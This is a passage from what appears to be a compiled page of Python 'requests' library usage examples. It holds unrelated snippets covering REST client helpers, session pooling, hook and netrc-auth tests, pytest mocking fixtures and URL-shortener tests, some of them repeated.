        print(resp.json()["info"]) 
**************************************
def _delete_policy_assign(self, rule_json):
        """Send a JSON object representing an policy domain assignment
        revoke to ACLSwitch.

        :param rule_json: The JSON object to send.
        """
        try:
            resp = requests.delete(self._url_policy_assign,
                                   data=rule_json, headers={
                                    "Content-type": "application/json"})
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error creating resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return
        print(resp.json()["info"]) 
**************************************
def _fetch_switches(self):
        """Fetch the switches from ACLSwitch.

        :return: Dict of switch IDs to dict of policy domains, None if
        error.
        """
        print("Fetching Switch list...")
        try:
            resp = requests.get(self._url_switch)
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return None
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return None
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return None
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return None
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error fetching resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return None
        return resp.json()["info"]["switches"] 
**************************************
def _post_acl_rule(self, rule_json):
        """Send a JSON object representing an ACL rule to ACLSwitch
        for creation.

        :param rule_json: The JSON object to send.
        """
        try:
            resp = requests.post(self._url_acl, data=rule_json,
                                 headers={"Content-type":
                                          "application/json"})
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error creating resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return
        print(resp.json()["info"]) 
**************************************
def _delete_acl_rule(self, rule_json):
        """Send a JSON object representing an ACL rule ID to ACLSwitch
        for removal.

        :param rule_json: The JSON object to send.
        """
        try:
            resp = requests.delete(self._url_acl, data=rule_json,
                                   headers={"Content-type":
                                            "application/json"})
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error deleting resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return
        print(resp.json()["info"]) 
**************************************
def _fetch_acl(self):
        """Fetch the ACL from ACLSwitch.

        :return: The ACL as a dict of rules, None if error.
        """
        print("Fetching ACL...")
        try:
            resp = requests.get(self._url_acl)
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return None
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return None
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return None
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return None
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error fetching resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return None
        return resp.json()["info"]["acl"] 
**************************************
def _fetch_time_queue(self):
        """Fetch the time enforced ACL time queue from ACLSwitch.

        :return: The time queue as a dict of times to rule IDs, None if
        error.
        """
        print("Fetching time queue...")
        try:
            resp = requests.get(self._url_acl_time)
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return None
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return None
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return None
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return None
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error fetching resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return None
        return resp.json()["info"]["time_queue"] 
**************************************
def get_story(new):
    """Return a story of the given ID."""
    url = URLS['item'].format(new)
    try:
        data = req.get(url)
    except req.ConnectionError:
        raise
    except req.Timeout:
        raise req.Timeout('A timeout problem occurred.')
    except req.TooManyRedirects:
        raise req.TooManyRedirects('The request exceeds the configured number\
            of maximum redirections.')
    else:
        return data.json() 
**************************************
def __fetchdata_and_make_mdx(self, arg, part, suffix=''):
        sdir, d_app, d_w = arg['dir'], OrderedDict(), OrderedDict(part)
        words, crefs, count, logs, failed = [], OrderedDict(), 1, [], []
        leni = len(part)
        while leni:
            for url, cur in part:
                if count % 100 == 0:
                    print ".",
                    if count % 1000 == 0:
                        print count,
                try:
                    status, page = getpage2(self.makeurl(url))
                    if page:
                        if status == 200:
                            if self.makeword(page, cur, words, logs, d_app):
                                crefs[cur] = url
                                count += 1
                        elif cur.strip().lower() != page.strip().lower():
                            words.append((cur, ''.join(['@@@LINK=', page])))
                    elif status == 404:
                        logs.append("E02:\tCan't download '%s', word not found" % cur)
                    else:
                        failed.append((url, cur))
                except requests.TooManyRedirects, e:
                    logs.append("E01:\tCan't download '%s', TooManyRedirects" % cur)
                    print url
                except Exception, e:
                    import traceback
                    print traceback.print_exc()
                    print "%s failed, retry automatically later" % cur
                    failed.append((url, cur)) 
**************************************
def main():
    """Main entry point for the script"""
    parser = argparse.ArgumentParser(
        prog='PyVegan',
        description='The better way to collect some delicious vegan recipes!',
        usage="""
        PyVegan - Get delicious vegan recipes from the web!
        Usage: pyvegan [-s/--search ingredient_to_search]


        Examples:
        - Get recipes with potato
            $ pyvegan -s batata
        - Get recipes that use more than one ingredient
            $ pyvegan -s "batata e tomate"

        How to get basic options and help? Use -h/--help
        """,
    )
    parser.add_argument(
        '-s',
        '--search',
        type=str,
        help='Get recipes using the given ingredients'
    )

    options = parser.parse_args()

    if options.search:
        param = options.search
    else:
        param = ''

    try:
        browser = Browser()
        browser.search(param)
        content = browser.page_content()
    except requests.ConnectionError:
        print('A connection problem occurred.')
    except requests.Timeout:
        print('A timeout problem occurred.')
    except requests.TooManyRedirects:
        msg = (
            'The request exceeds the configured'
            ' number of maximum redirections.'
        )
        print(msg)
    except Exception as e:
        print(e)

    if not content:
        return

    recipeManager = RecipeManager(content)
    recipes = recipeManager.recipes

    menu = Menu(recipes)
    menu.build()
    menu.show() 

Python requests.hooks() Examples

**************************************
def __init__(self):
    self.headers = default_headers()
    self.auth = None
    self.proxies = {}
    self.hooks = default_hooks()
    self.params = {}
    self.stream = False
    self.verify = True
    self.cert = None
    self.max_redirects = DEFAULT_REDIRECT_LIMIT
    self.trust_env = True
    self.cookies = cookiejar_from_dict({})
    self.adapters = OrderedDict()
    self.mount('https://', HTTPAdapter())
    self.mount('http://', HTTPAdapter())
    self.redirect_cache = RecentlyUsedContainer(REDIRECT_CACHE_SIZE)

    self._get_proxies() 
**************************************
def test_hook_receives_request_arguments(self, httpbin):
        def hook(resp, **kwargs):
            assert resp is not None
            assert kwargs != {}

        s = requests.Session()
        r = requests.Request('GET', httpbin(), hooks={'response': hook})
        prep = s.prepare_request(r)
        s.send(prep) 
**************************************
def test_session_hooks_are_used_with_no_request_hooks(self, httpbin):
        hook = lambda x, *args, **kwargs: x
        s = requests.Session()
        s.hooks['response'].append(hook)
        r = requests.Request('GET', httpbin())
        prep = s.prepare_request(r)
        assert prep.hooks['response'] != []
        assert prep.hooks['response'] == [hook] 
**************************************
def test_session_hooks_are_overridden_by_request_hooks(self, httpbin):
        hook1 = lambda x, *args, **kwargs: x
        hook2 = lambda x, *args, **kwargs: x
        assert hook1 is not hook2
        s = requests.Session()
        s.hooks['response'].append(hook2)
        r = requests.Request('GET', httpbin(), hooks={'response': [hook1]})
        prep = s.prepare_request(r)
        assert prep.hooks['response'] == [hook1] 
**************************************
def test_prepared_request_hook(self, httpbin):
        def hook(resp, **kwargs):
            resp.hook_working = True
            return resp

        req = requests.Request('GET', httpbin(), hooks={'response': hook})
        prep = req.prepare()

        s = requests.Session()
        s.proxies = getproxies()
        resp = s.send(prep)

        assert hasattr(resp, 'hook_working') 
**************************************
def test_data_argument_accepts_tuples(data):
    """Ensure that the data argument will accept tuples of strings
    and properly encode them.
    """
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data=data,
        hooks=default_hooks()
    )
    assert p.body == urlencode(data) 
**************************************
def test_hook_receives_request_arguments(self, httpbin):
        def hook(resp, **kwargs):
            assert resp is not None
            assert kwargs != {}

        s = requests.Session()
        r = requests.Request('GET', httpbin(), hooks={'response': hook})
        prep = s.prepare_request(r)
        s.send(prep) 
**************************************
def test_session_hooks_are_used_with_no_request_hooks(self, httpbin):
        hook = lambda x, *args, **kwargs: x
        s = requests.Session()
        s.hooks['response'].append(hook)
        r = requests.Request('GET', httpbin())
        prep = s.prepare_request(r)
        assert prep.hooks['response'] != []
        assert prep.hooks['response'] == [hook] 
**************************************
def test_session_hooks_are_overridden_by_request_hooks(self, httpbin):
        hook1 = lambda x, *args, **kwargs: x
        hook2 = lambda x, *args, **kwargs: x
        assert hook1 is not hook2
        s = requests.Session()
        s.hooks['response'].append(hook2)
        r = requests.Request('GET', httpbin(), hooks={'response': [hook1]})
        prep = s.prepare_request(r)
        assert prep.hooks['response'] == [hook1] 
**************************************
def test_prepared_request_hook(self, httpbin):
        def hook(resp, **kwargs):
            resp.hook_working = True
            return resp

        req = requests.Request('GET', httpbin(), hooks={'response': hook})
        prep = req.prepare()

        s = requests.Session()
        s.proxies = getproxies()
        resp = s.send(prep)

        assert hasattr(resp, 'hook_working') 
**************************************
def test_data_argument_accepts_tuples(data):
    """Ensure that the data argument will accept tuples of strings
    and properly encode them.
    """
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data=data,
        hooks=default_hooks()
    )
    assert p.body == urlencode(data) 
**************************************
def test_hook_receives_request_arguments(self):
        def hook(resp, **kwargs):
            assert resp is not None
            assert kwargs != {}

        requests.Request('GET', HTTPBIN, hooks={'response': hook}) 
**************************************
def test_session_hooks_are_used_with_no_request_hooks(self):
        hook = lambda x, *args, **kwargs: x
        s = requests.Session()
        s.hooks['response'].append(hook)
        r = requests.Request('GET', HTTPBIN)
        prep = s.prepare_request(r)
        assert prep.hooks['response'] != []
        assert prep.hooks['response'] == [hook] 
**************************************
def test_session_hooks_are_overriden_by_request_hooks(self):
        hook1 = lambda x, *args, **kwargs: x
        hook2 = lambda x, *args, **kwargs: x
        assert hook1 is not hook2
        s = requests.Session()
        s.hooks['response'].append(hook2)
        r = requests.Request('GET', HTTPBIN, hooks={'response': [hook1]})
        prep = s.prepare_request(r)
        assert prep.hooks['response'] == [hook1] 
**************************************
def test_prepared_request_hook(self):
        def hook(resp, **kwargs):
            resp.hook_working = True
            return resp

        req = requests.Request('GET', HTTPBIN, hooks={'response': hook})
        prep = req.prepare()

        s = requests.Session()
        s.proxies = getproxies()
        resp = s.send(prep)

        assert hasattr(resp, 'hook_working') 
**************************************
def test_data_argument_accepts_tuples(list_of_tuples):
    """
    Ensure that the data argument will accept tuples of strings
    and properly encode them.
    """
    for data in list_of_tuples:
        p = PreparedRequest()
        p.prepare(
            method='GET',
            url='http://www.example.com',
            data=data,
            hooks=default_hooks()
        )
        assert p.body == urlencode(data) 
**************************************
def test_prepared_request_no_cookies_copy():
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data='foo=bar',
        hooks=default_hooks()
    )
    assert_copy(p, p.copy()) 
**************************************
def test_prepared_request_complete_copy():
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data='foo=bar',
        hooks=default_hooks(),
        cookies={'foo': 'bar'}
    )
    assert_copy(p, p.copy()) 
**************************************
def test_prepare_unicode_url():
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url=u('http://www.example.com/üniçø∂é'),
        hooks=[]
    )
    assert_copy(p, p.copy()) 
**************************************
def test_hook_receives_request_arguments(self, httpbin):
        def hook(resp, **kwargs):
            assert resp is not None
            assert kwargs != {}

        requests.Request('GET', httpbin(), hooks={'response': hook}) 
**************************************
def test_session_hooks_are_used_with_no_request_hooks(self, httpbin):
        hook = lambda x, *args, **kwargs: x
        s = requests.Session()
        s.hooks['response'].append(hook)
        r = requests.Request('GET', httpbin())
        prep = s.prepare_request(r)
        assert prep.hooks['response'] != []
        assert prep.hooks['response'] == [hook] 
**************************************
def test_session_hooks_are_overridden_by_request_hooks(self, httpbin):
        hook1 = lambda x, *args, **kwargs: x
        hook2 = lambda x, *args, **kwargs: x
        assert hook1 is not hook2
        s = requests.Session()
        s.hooks['response'].append(hook2)
        r = requests.Request('GET', httpbin(), hooks={'response': [hook1]})
        prep = s.prepare_request(r)
        assert prep.hooks['response'] == [hook1] 
**************************************
def test_prepared_request_hook(self, httpbin):
        def hook(resp, **kwargs):
            resp.hook_working = True
            return resp

        req = requests.Request('GET', httpbin(), hooks={'response': hook})
        prep = req.prepare()

        s = requests.Session()
        s.proxies = getproxies()
        resp = s.send(prep)

        assert hasattr(resp, 'hook_working') 
**************************************
def test_data_argument_accepts_tuples(list_of_tuples):
    """
    Ensure that the data argument will accept tuples of strings
    and properly encode them.
    """
    for data in list_of_tuples:
        p = PreparedRequest()
        p.prepare(
            method='GET',
            url='http://www.example.com',
            data=data,
            hooks=default_hooks()
        )
        assert p.body == urlencode(data) 
**************************************
def test_prepared_request_no_cookies_copy():
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data='foo=bar',
        hooks=default_hooks()
    )
    assert_copy(p, p.copy()) 
**************************************
def test_prepared_request_complete_copy():
    p = PreparedRequest()
    p.prepare(
        method='GET',
        url='http://www.example.com',
        data='foo=bar',
        hooks=default_hooks(),
        cookies={'foo': 'bar'}
    )
    assert_copy(p, p.copy()) 

Python requests.sessions() Examples

**************************************
def __init__(self, config):
        from .configuration import Configuration
        if not isinstance(config, Configuration):
            raise ValueError("'config' %r must be a Configuration instance" % config)
        if not config.service_endpoint:
            raise AttributeError("'config.service_endpoint' must be set")
        self.config = config
        self._session_pool_size = self.SESSION_POOLSIZE

        # Autodetect authentication type if necessary
        if self.config.auth_type is None:
            self.config.auth_type = self.get_auth_type()

        # Try to behave nicely with the remote server. We want to keep the connection open between requests.
        # We also want to re-use sessions, to avoid the NTLM auth handshake on every request. We must know the
        # authentication method to create a session pool.
        self._session_pool = self._create_session_pool()
        self._session_pool_lock = Lock() 
**************************************
def test_default_factories(monkeypatch):
    """Check that default factories are used if None was specified.

    1. Create default application.
    2. Create a flask client without specifying rule factory.
    3. Create a method rule with the client.
    4. Set a fixed response with the client.
    5. Check the response.
    """
    application = configure_application()
    monkeypatch.setattr(requests.sessions.Session, "request", _create_patch(application))

    client = HTTPClient(configuration_url=DEFAULT_CONFIGURATION_ENDPOINT)

    rule = client.create_rule(rule=MethodRule(method="GET"))
    assert rule.rule_id is not None, "Rule was not created"

    client.set_response(rule_id=rule.rule_id, response=FixedResponse(status=200))

    assert application.test_client().get(DEFAULT_BASE_ENDPOINT).status_code == 200, "Wrong status" 
**************************************
def _redirect_requests(application_factory, monkeypatch):
    """Redirect requests to the application module."""
    application_client = application_factory().test_client()

    def _patched_request(session, method, url, json=None):
        # pylint: disable=unused-argument
        application_response = application_client.open(url, method=method, json=json)

        response = requests.Response()
        response.status_code = application_response.status_code
        response.headers.update(application_response.headers)
        response.raw = io.BytesIO(application_response.data)

        return response

    monkeypatch.setattr(requests.sessions.Session, "request", _patched_request) 
**************************************
def test_fixture_simple_patch_with_session_raises_error(testdir):
    """Use the patch with a requests session """

    # create a temporary pytest test module
    testdir.makepyfile(
        """
        import requests
        from requests.sessions import Session
        import requests.exceptions
        import pytest

        def test_simple_with_session(requests_mock):
            with requests_mock.patch('/api/test') as patch:
                patch.returns = requests_mock.bad('hello')
                with Session() as s:
                    response = s.get('https://test.api/api/test')
                    assert response.text == 'hello'
                    with pytest.raises(requests.exceptions.HTTPError):
                        response.raise_for_status()
    """
    )
    result = testdir.runpytest("-v")
    result.stdout.fnmatch_lines(["*::test_simple_with_session PASSED*"])
    assert result.ret == 0 
**************************************
def test_mock_context(testdir):
    """Check that the patched HTTPAdapter is reset"""
    testdir.makepyfile(
        """
        import requests
        import requests.sessions
        import pytest

        def test_context(requests_mock):
            original = requests.sessions.HTTPAdapter
            with requests_mock.patch('/api/not_test') as patch:
                assert requests.sessions.HTTPAdapter is not original
            assert requests.sessions.HTTPAdapter is original
    """
    )

    result = testdir.runpytest("-v")
    result.stdout.fnmatch_lines(["*::test_context PASSED*"])
    assert result.ret == 0 
**************************************
def test_basicauth_with_netrc(self, httpbin):
        auth = ('user', 'pass')
        wrong_auth = ('wronguser', 'wrongpass')
        url = httpbin('basic-auth', 'user', 'pass')

        old_auth = requests.sessions.get_netrc_auth

        try:
            def get_netrc_auth_mock(url):
                return auth
            requests.sessions.get_netrc_auth = get_netrc_auth_mock

            # Should use netrc and work.
            r = requests.get(url)
            assert r.status_code == 200

            # Given auth should override and fail.
            r = requests.get(url, auth=wrong_auth)
            assert r.status_code == 401

            s = requests.session()

            # Should use netrc and work.
            r = s.get(url)
            assert r.status_code == 200

            # Given auth should override and fail.
            s.auth = wrong_auth
            r = s.get(url)
            assert r.status_code == 401
        finally:
            requests.sessions.get_netrc_auth = old_auth 
**************************************
def test_basicauth_with_netrc(self, httpbin):
        auth = ('user', 'pass')
        wrong_auth = ('wronguser', 'wrongpass')
        url = httpbin('basic-auth', 'user', 'pass')

        old_auth = requests.sessions.get_netrc_auth

        try:
            def get_netrc_auth_mock(url):
                return auth
            requests.sessions.get_netrc_auth = get_netrc_auth_mock

            # Should use netrc and work.
            r = requests.get(url)
            assert r.status_code == 200

            # Given auth should override and fail.
            r = requests.get(url, auth=wrong_auth)
            assert r.status_code == 401

            s = requests.session()

            # Should use netrc and work.
            r = s.get(url)
            assert r.status_code == 200

            # Given auth should override and fail.
            s.auth = wrong_auth
            r = s.get(url)
            assert r.status_code == 401
        finally:
            requests.sessions.get_netrc_auth = old_auth 
**************************************
def connect(self):
        '''
        connection function
        '''
        try:
            logger.debug("Establishing Connection")
            self.session = requests.session()
            self.session.verify = self.verify_callback

            pylxca_version = pkg_resources.require("pylxca")[0].version
            # Update the headers with your custom ones
            # You don't have to worry about case-sensitivity with
            # the dictionary keys, because default_headers uses a custom
            # CaseInsensitiveDict implementation within requests' source code.
            self.session.headers.update({'content-type': 'application/json; charset=utf-8','User-Agent': 'LXCA via Python Client / ' + pylxca_version})


            payload = dict(UserId= self.user, password=base64.b16decode(self.passwd).decode())
            pURL = self.url + '/sessions'
            self.session.mount(self.url, lxcaAdapter(max_retries=self.retires))
            r = self.session.post(pURL,data = json.dumps(payload),headers=dict(Referer=pURL),verify=self.verify_callback, timeout = 3)
            r.raise_for_status()
        except ConnectionError as e:
            logger.debug("Connection Exception as ConnectionError: Exception = %s", e)
            return False
        except requests.exceptions.HTTPError as e:
            logger.debug("Connection Exception as HttpError: Exception = %s", e.response.text)
            return False
        except Exception as e:
            logger.debug("Connection Exception: Exception = %s", e)
            return False

        '''
        Even though the csrf-token cookie will be automatically sent with the request,
        the server will be still expecting a valid X-Csrf-Token header,
        So we need to set it explicitly here
        '''
        if r.status_code == requests.codes['ok']:
            self.session.headers.update({'X-Csrf-Token': self.session.cookies.get('csrf')})

        return  True 
**************************************
def disconnect(self):
        '''
        session Disconnection
        '''
        result = False
        try:
            delete_url = self.url + '/sessions'
            resp = self.session.delete(delete_url, verify=False, timeout=3)
            py_obj = json.loads(resp.text)
            logger.debug("Deleted session on lxca = %s", py_obj)
            result = True
        except Exception as e:
            logger.debug("Unable to delete session on lxca = %s", e)
            raise ConnectionError("Invalid connection: Connection is not Initialized")

        self.url = None
        self.user = None
        self.passwd = None
        self.debug = False
        try:
            self.session.close()
        except Exception as e:
            logger.debug("Connection with invalid session = %s", e)
            raise Exception("Invalid connection: Connection is not Initialized")
        self.session = None
        return result 
**************************************
def test_basicauth_with_netrc(self):
        auth = ('user', 'pass')
        wrong_auth = ('wronguser', 'wrongpass')
        url = httpbin('basic-auth', 'user', 'pass')

        def get_netrc_auth_mock(url):
            return auth
        requests.sessions.get_netrc_auth = get_netrc_auth_mock

        # Should use netrc and work.
        r = requests.get(url)
        assert r.status_code == 200

        # Given auth should override and fail.
        r = requests.get(url, auth=wrong_auth)
        assert r.status_code == 401

        s = requests.session()

        # Should use netrc and work.
        r = s.get(url)
        assert r.status_code == 200

        # Given auth should override and fail.
        s.auth = wrong_auth
        r = s.get(url)
        assert r.status_code == 401 
**************************************
def close(self):
        log.debug('Server %s: Closing sessions', self.server)
        while True:
            try:
                self._session_pool.get(block=False).close()
            except Empty:
                break 
**************************************
def _create_session_pool(self):
        # Create a pool to reuse sessions containing connections to the server
        session_pool = LifoQueue(maxsize=self._session_pool_size)
        for _ in range(self._session_pool_size):
            session_pool.put(self.create_session(), block=False)
        return session_pool 
**************************************
def get_session(self):
        _timeout = 60  # Rate-limit messages about session starvation
        while True:
            try:
                log.debug('Server %s: Waiting for session', self.server)
                session = self._session_pool.get(timeout=_timeout)
                log.debug('Server %s: Got session %s', self.server, session.session_id)
                return session
            except Empty:
                # This is normal when we have many worker threads starving for available sessions
                log.debug('Server %s: No sessions available for %s seconds', self.server, _timeout) 
**************************************
def release_session(self, session):
        # This should never fail, as we don't have more sessions than the queue contains
        log.debug('Server %s: Releasing session %s', self.server, session.session_id)
        try:
            self._session_pool.put(session, block=False)
        except Full:
            log.debug('Server %s: Session pool was already full %s', self.server, session.session_id) 
**************************************
def clear_cache(mcs):
        for key, protocol in mcs._protocol_cache.items():
            if isinstance(protocol, Exception):
                continue
            service_endpoint = key[0]
            log.debug("Service endpoint '%s': Closing sessions", service_endpoint)
            protocol.close()
        mcs._protocol_cache.clear() 
**************************************
def close(self):
        log.debug('Server %s: Closing thread pool', self.server)
        # Close the thread pool before closing the session pool to ensure all sessions are released.
        if "thread_pool" in self.__dict__:
            # Calling thread_pool.join() in Python 3.8 will hang forever. This is seen when running a test case that
            # uses the thread pool, e.g.: python tests/__init__.py MessagesTest.test_export_with_error
            # I don't know yet why this is happening.
            self.thread_pool.terminate()
            del self.__dict__["thread_pool"]
        super(Protocol, self).close() 
**************************************
def _fail_requests(monkeypatch):
    """Fail requests."""
    def _patched_request(*args, **kwargs):
        # pylint: disable=unused-argument
        response = requests.Response()
        response.status_code = 400

        return response

    monkeypatch.setattr(requests.sessions.Session, "request", _patched_request) 
**************************************
def test_mock_context(requests_mock):
    original = requests.sessions.HTTPAdapter
    with requests_mock.patch("/api/not_test"):
        assert requests.sessions.HTTPAdapter is not original
    assert requests.sessions.HTTPAdapter is original 
**************************************
def test_fixture_simple_patch_with_session(testdir):
    """Use the patch with a requests session """

    # create a temporary pytest test module
    testdir.makepyfile(
        """
        import requests
        from requests.sessions import Session

        def test_simple_with_session(requests_mock):
            with requests_mock.patch('/api/test') as patch:
                patch.returns = requests_mock.good('hello')
                with Session() as s:
                    response = s.get('https://test.api/api/test')
                    assert response.text == 'hello'
    """
    )

    # run pytest with the following cmd args
    result = testdir.runpytest("-v")

    # fnmatch_lines does an assertion internally
    result.stdout.fnmatch_lines(["*::test_simple_with_session PASSED*"])

    # make sure that that we get a '0' exit code for the testsuite
    assert result.ret == 0 
**************************************
def test_basicauth_with_netrc(self, httpbin):
        auth = ('user', 'pass')
        wrong_auth = ('wronguser', 'wrongpass')
        url = httpbin('basic-auth', 'user', 'pass')

        old_auth = requests.sessions.get_netrc_auth

        try:
            def get_netrc_auth_mock(url):
                return auth
            requests.sessions.get_netrc_auth = get_netrc_auth_mock

            # Should use netrc and work.
            r = requests.get(url)
            assert r.status_code == 200

            # Given auth should override and fail.
            r = requests.get(url, auth=wrong_auth)
            assert r.status_code == 401

            s = requests.session()

            # Should use netrc and work.
            r = s.get(url)
            assert r.status_code == 200

            # Given auth should override and fail.
            s.auth = wrong_auth
            r = s.get(url)
            assert r.status_code == 401
        finally:
            requests.sessions.get_netrc_auth = old_auth 
**************************************
def __init__(self):
        self.session = requests.sessions.Session() 

Python requests.response() Examples

**************************************
def upload_file(self, file_path, raw_input=False):
        """
        Upload local file to Capella
        :param file_path: local file path for uploading to Capella
        :param raw_input: True if file_path is image raw bytes
        :return: False if error or response if success (watch doc for self.processRespose)
        """
        if not raw_input and not os.path.isfile(file_path):
            logging.error("[uploadFile] file not found: {}".format(file_path))
            return False
        try:
            files = {'file': file_path} if raw_input else {'file': open(file_path, 'rb')}
            response = requests.post(self.API_URL, files=files)
            return self.process_respose(response)

        except Exception as e:
            logging.error("[uploadFile runtime error]: {}".format(e))
            return False 
**************************************
def emaillogin(email, otp):  # pragma: no cover
    """Raw Cloud API call, request cloud token with email address & OTP.

    Args:
        email(str): Email address connected to Cozify account.
        otp(int): One time passcode.

    Returns:
        str: cloud token
    """

    payload = {'email': email, 'password': otp}

    response = requests.post(cloudBase + 'user/emaillogin', params=payload)
    if response.status_code == 200:
        return response.text
    else:
        raise APIError(response.status_code, response.text) 
**************************************
def test_shorten(self):
        data = self.data
        response = self.client.call('/shorten', data=data, headers=self.headers)
        short_url = self._get_short_url_from_response(response)
        self.assertEqual(response.status_code, 200)
        self.assertTrue('value="{}"'.format(short_url) in response.text)
        self.assertTrue('Copy To Clipboard' in response.text)
        self.assertTrue('Shorten Another Link' in response.text)
        self.assertTrue('{}+'.format(short_url) in response.text)

        # Repeat shorten should return the same result
        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        self.assertEqual(response.status_code, 200)
        self.assertTrue('value="{}"'.format(short_url) in response.text)

        # Test a different url
        data['long_url'] = 'https://www.python.org/'
        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        short_url = self._get_short_url_from_response(response)
        self.assertEqual(response.status_code, 200)
        self.assertTrue('value="{}"'.format(short_url) in response.text) 
**************************************
def test_login_shorten(self):
        response = requests.post(self.url + '/signup', data=self.user_data, headers=self.headers)
        with requests.Session() as sess:
            response = sess.post(self.url + '/login', data=self.login_data, headers=self.headers)
            self.cookies = sess.cookies
            self.assertTrue('Welcome Test' in response.text)

            # Shorten the URL
            data = self.data
            data['long_url'] = 'https://example.com/1'
            response = sess.post(self.url + '/shorten', data=data, headers=self.headers)
            short_url = self._get_short_url_from_response(response)

            self.assertEqual(response.status_code, 200)
            self.assertTrue('value="{}"'.format(short_url) in response.text)
            self.assertTrue('Welcome Test' in response.text)
            self.assertTrue('Copy To Clipboard' in response.text)
            self.assertTrue('Shorten Another Link' in response.text)

            # verify its on dashboard
            response = sess.get(self.url + '/dashboard')
            short_code = short_url.split('/')[-1]
            self.assertEqual(response.status_code, 200)
            self.assertTrue('{}+'.format(short_code) in response.text)
            self.assertTrue('https://example.com/1' in response.text) 
**************************************
def test_link_hits(self):
        data = self.data
        data['long_url'] = 'http://example.com/index'
        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        short_url = self._get_short_url_from_response(response)

        # Open link
        for i in range(2):
            requests.get(short_url)
            stats_page = requests.get(short_url + '+')
            self.assertEqual(stats_page.status_code, 200)
            self.assertTrue('Total Hits: {}'.format(i+1) in stats_page.text)

    # def test_link_stats(self):
    #     pass
    #
    # def test_secret_link_stats(self):
    #     pass
    #
    # def test_expired_link_stats(self):
    #     pass
    # 
**************************************
def test_custom_link_stats(self):
        data = self.data
        data['custom_url'] = 'ninja'
        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        short_url = self._get_short_url_from_response(response)

        # Open link
        for i in range(2):
            requests.get(short_url)
            stats_page = requests.get(short_url + '+')
            self.assertEqual(stats_page.status_code, 200)
            self.assertTrue('Total Hits: {}'.format(i+1) in stats_page.text)

    # #######################
    # # Test static resources
    # ####################### 
**************************************
def _validate_response(self, response):
        """ Ensures response from BLS server is valid.

        Parameters
        ----------
        response: requests.response
            A requests.response object

        Returns
        -------
        response: Parsed JSON
            A json-formatted response

        Raises
        ------
        ValueError
            If a single Share symbol is invalid
        BLSQueryError
            If the JSON response is empty or throws an error

        """
        json_response = response.json()
        if "Error Message" in json_response:
            raise BLSQueryError()
        if json_response["status"] == 'REQUEST_NOT_PROCESSED':
            if self.version > 1:
                raise BLSAuthError(self.api_key)
            else:
                raise BLSQueryError()
        elif json_response["status"] == 'REQUEST_SUCCEEDED':
            for message in json_response["message"]:
                if any(code in message for code in
                       BLSMessages.INVALID_SERIES):
                    raise BLSSeriesError(message.split()[-1])

        return json_response 
**************************************
def _execute_BLS_query(self, data):
        """ Executes HTTP Request
        Given a URL, execute HTTP request from BLS server. If request is
        unsuccessful, attempt is made self.retry_count times with pause of
        self.pause in between.

        Parameters
        ----------
        data: str
            A properly-formatted JSON dump of desired request parameters

        Returns
        -------
        response: requests.response
            Sends requests.response object to validator

        Raises
        ------
        BLSQueryError
            If problems arise when making the query
        """
        pause = self.pause
        for i in range(self.retry_count+1):
            # print(self._BLS_API_URL)
            # print(data)
            # print(self._BLS_API_HEADERS)
            # exit()
            response = self.session.post(url=self._BLS_API_URL, data=data,
                                         headers=self._BLS_API_HEADERS)
